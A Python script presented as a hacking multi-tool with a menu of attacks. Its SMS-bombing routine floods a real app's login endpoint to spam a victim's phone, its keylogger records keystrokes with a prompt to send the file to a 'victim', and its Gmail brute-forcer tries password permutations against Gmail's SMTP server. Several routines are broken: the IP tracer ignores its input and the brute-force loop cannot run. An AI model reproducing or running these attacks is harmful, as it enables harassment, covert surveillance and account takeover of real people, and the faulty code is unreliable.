print( """ 

  _                      ______   _______   ____  ____  ______           ______  \     /
 / |  x     \            |        |      |  |   \/   |  |  _  \  |       |        \   /
(  )        0         m  |        |      |  |  |\/|  |  | |_)  | |       |         \ /
 \_/-, ,----'  ____      |        |      |  |  |  |  |  |   __/  |       |____     /\         
    ====      ||   \_    |        |      |  |  |  |  |  |  |     |       |        /  \ 
   /  \-'~;   ||     |   |        |      |  |  |  |  |  |  |     |       |       /    \ 
  /  __/~| ...||__/|_|   |_____   |______|  |  |  |  |  |  |     |______ |_____ /      \   
=(  _____||________|                                  v.1.0.0
                                                 Multiple tool for h4cking

DISCLAIM : ONLY USE THIS TOOL FOR EDUCATION PURPOSE                                                 

                                                     Join our discord servers
                                                     https://discord.gg/GfYyvNS9a5
                                                     https://discord.gg/qE4nedb5C6
""")


import phonenumbers as pn  #Phone info
from phonenumbers import carrier, geocoder, timezone #Phone info
import os
import json #IP-Tracer
import sys
from urllib.request import urlopen #IP-Tracer
from tqdm import tqdm #SMS bombing
import requests #SMS bombing
import asyncio
from nslookup import Nslookup #nslookup
from socket import * #port scanning
import time #port scanning
from PIL import Image #encryption
import numpy as np  #encryption
from pynput.keyboard import Listener #keylogger
import itertools #Gmail brute force 
import smtplib  #Gmail brute force


while True:
    print('[1] Phone number info ')
    print('[2] IP-Trace')
    print('[3] Bombing')
    print('[4] Nslookup')
    print('[5] Port Scanning')
    print('[6] Steganography')
    print('[7] Keylogger')
    print('[8] Gmail BruteForce')
    print('[9] EXIT')
    player_choice = input()

#PHONE INFO
    if player_choice =='1':
        phone = pn.parse(input('Enter phone number(ex. +30**********) : '))
        print(phone)
        print(pn.is_valid_number(phone))
        print(carrier.name_for_number(phone, 'en'))
        print(geocoder.description_for_number(phone, 'en'))
        print(timezone.time_zones_for_number(phone))
        continue
#IP TRACER   
    elif player_choice =='2':
        ip=input ("Enter target ip :")
        url = "http://ip-api.com/json/"
        response = urlopen(url)
        data = response.read()
        values = json.loads(data)
        print("IP:" + values ['query'])
        print("City:" + values ['city'])
        print("ISP:" + values ['isp'])
        print("Country:" + values ['country'])
        print("Region:" + values ['region'])
        print("Time Zone : " + values ['timezone'])
        continue   
    else:
        print('')

#SMS BOMBING
    if player_choice =='3':
        headers = ({'User-Agent':
            'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
        phoneNumber = input("Enter phone number(ex. 44**********) : ")
        phoneNumber = str(phoneNumber)
        url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber
        numofmsgs = int(input("Enter number of messages to send: "))
        successspamCount = 0
        failspamCount = 0
        for i in tqdm(range(numofmsgs)):
            resp = requests.get(url)
            if resp.status_code == 200:
                successspamCount = successspamCount + 1
            else: 
                failspamCount = failspamCount + 1
                print("Total successful messages sent: ",  successspamCount)
                print("Total failed messages sent: ", failspamCount)

#NSLOOKUP
    if player_choice =='4':
        domain =input('Enter domain(ex. example.com) : ')
        dns_query = Nslookup(dns_servers=["1.1.1.1"])
        ips_record = dns_query.dns_lookup(domain)
        print(ips_record.response_full, ips_record.answer)
        soa_record = dns_query.soa_lookup(domain)
        print(soa_record.response_full, soa_record.answer)
        continue
    else:
        print('')


#PORT SCANNER
    startTime = time.time()
    if player_choice =='5':
        target = input('Enter the host to be scanned: ')
        t_IP = gethostbyname(target)
        print ('Starting scan on host: ', t_IP)
        for i in range(50, 500):
            s = socket(AF_INET, SOCK_STREAM)       
            conn = s.connect_ex((t_IP, i))
            if(conn == 0) :
                print('Port %d: OPEN' % (i,))
                s.close()
        print('Time taken:', time.time() - startTime)
        continue

#STEGANOGRAPHY
    if player_choice =='6':
        def encrypt_pixel(img, byte_array):
            c=-1
            for pix in img:
                c=-1
                try:
                       #print(img[c])
                        if byte_array[c] == '1':
                           # even
                           if img[c] % 2 == 0:
                               img[c] -= 1
                        elif byte_array[c] == '0':
                            # odd
                            if img[c] % 2 != 0:
                                img[c] -= 1
                        elif byte_array[c] == ' ':
                            if img[c] % 2 != 0:
                                img[c] -= 1
                        #print(img[c],byte_array[c])
                except:
                        if img[c] % 2 == 0:
                            img[c] -= 1
                        break
            return img
        def get_byte(a):
            a_bytes = bytes(a, "ascii")
            return  (' '.join(format(ord(x), '08b') for x in a))
        if __name__ == '__main__':
            #'1.png'
            image_name = input('Please Enter Image Name:')
            im = Image.open(image_name)
            x,y = list(im.size)
            rgb = np.asarray(im).reshape(-1)
            new_img = np.array(rgb)
            masg =input('Please enter your massage: ')
            enc = get_byte(masg)
            encrypted  = (encrypt_pixel(new_img,enc))
            final_img = encrypted.reshape(y,x,3)
            im = Image.fromarray(final_img)
            im.save("5.png")
            print('Encrypted and Saved (5.png)')
        continue

 #KEYLOGGER   
    if player_choice =='7':
        def writetofile(key):
          keydata = str(key)
          keydata = keydata.replace ("'","")
          with open ("log.txt","a") as f:
            f.write(keydata)
        async def main() :
            print('Saved to log.txt. U have 2m to send the txt to the victim(then delete the file from your computer)')
            await asyncio.sleep(120)
            print('log.txt STARTED')
            with Listener(on_press=writetofile) as l:
              l.join()
        asyncio.run(main())
        continue

#Gmail BruteForce 
    if player_choice =='8':
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        user = input("Enter Target's Gmail Address: ")
        def print_perms(chars, minlen, maxlen): 
            for n in range(minlen, maxlen+1): 
                for perm in itertools.product(chars, repeat=n): 
                    print(''.join(perm)) 
    print_perms("abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIGKLMNOPQRSTUVWXYZ!?*", 2, 4)
    for symbols in print_perms:
        try:
            smtpserver.login(user, password)
            print ("[+] Password Cracked: %s") % symbols
            break;
        except smtplib.SMTPAuthenticationError:
            print ("[!] Password Inccorect: %s") % symbols   
        continue
#EXIT
    if player_choice =='9':
        async def main():
            print('Exiting...')
            await asyncio.sleep(1)
            print('More features tools are coming stay tuned')
            await asyncio.sleep(1)
            print('Byee !!')      
            sys.exit()
        asyncio.run(main())
        
